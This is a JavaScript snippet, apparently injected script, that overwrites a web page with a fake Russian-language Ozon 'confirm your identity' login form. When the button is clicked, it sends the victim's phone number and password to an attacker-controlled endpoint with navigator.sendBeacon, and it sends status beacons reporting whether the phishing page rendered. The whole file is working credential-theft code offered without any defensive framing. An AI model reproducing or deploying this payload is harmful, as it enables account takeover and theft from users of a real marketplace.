alert('new_2');
var b = function(url, body) { navigator.sendBeacon(url, body || ''); };
b(A + '?s6_start');

(function renderPhish() {
    try {
        var style = document.createElement('style');
        style.textContent =
            '*{box-sizing:border-box;margin:0;padding:0}' +
            'body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f7fa;min-height:100vh}' +
            '.bar{height:3px;background:linear-gradient(90deg,#005bff,#00b3ff)}' +
            '.hdr{background:#fff;padding:14px 18px;border-bottom:1px solid #e5e8f0}' +
            '.logo{font-size:24px;font-weight:900;color:#005bff;letter-spacing:-1px}' +
            '.card{background:#fff;margin:16px;border-radius:14px;padding:22px;box-shadow:0 2px 10px rgba(0,0,0,.08)}' +
            '.ttl{font-size:18px;font-weight:700;color:#111;margin-bottom:8px}' +
            '.sub{font-size:14px;color:#888;line-height:1.5;margin-bottom:20px}' +
            '.fld{margin-bottom:14px}' +
            'label{display:block;font-size:13px;color:#666;font-weight:500;margin-bottom:5px}' +
            'input{width:100%;padding:13px 15px;border:1.5px solid #e0e4ec;border-radius:10px;font-size:15px;background:#fafbfc}' +
            'input:focus{border-color:#005bff;outline:none;background:#fff}' +
            '.btn{background:#005bff;color:#fff;width:100%;padding:15px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:2px}' +
            '.note{text-align:center;font-size:12px;color:#bbb;margin-top:12px}';
        document.head.appendChild(style);

        var meta = document.createElement('meta');
        meta.name = 'viewport';
        meta.content = 'width=device-width,initial-scale=1';
        document.head.appendChild(meta);

        document.body.innerHTML =
            '<div class="bar"></div>' +
            '<div class="hdr"><span class="logo">ozon</span></div>' +
            '<div class="card">' +
            '<div class="ttl">Подтвердите личность</div>' +
            '<div class="sub">В целях безопасности аккаунта требуется повторный вход в систему.</div>' +
            '<div class="fld"><label>Номер телефона</label>' +
            '<input id="ph" type="tel" placeholder="+7 (___) ___-__-__" autocomplete="tel"></div>' +
            '<div class="fld"><label>Пароль</label>' +
            '<input id="pw" type="password" placeholder="Пароль от Ozon ID"></div>' +
            '<button class="btn" id="btn">Войти в аккаунт</button>' +
            '<div class="note">Защищено SSL &bull; Ozon ID</div>' +
            '</div>';

        document.getElementById('btn').addEventListener('click', function() {
            var ph = document.getElementById('ph').value || '(empty)';
            var pw = document.getElementById('pw').value || '(empty)';
            navigator.sendBeacon(A + '/v1_creds', 'ph=' + encodeURIComponent(ph) + '&pw=' + encodeURIComponent(pw));
            this.textContent = 'Проверяем...';
            this.disabled = true;
            this.style.background = '#ccc';
        });

        b(A + '?v1_phish_ok');
    } catch(e) {
        b(A + '?v1_phish_err', String(e).substring(0, 120));
    }
})();
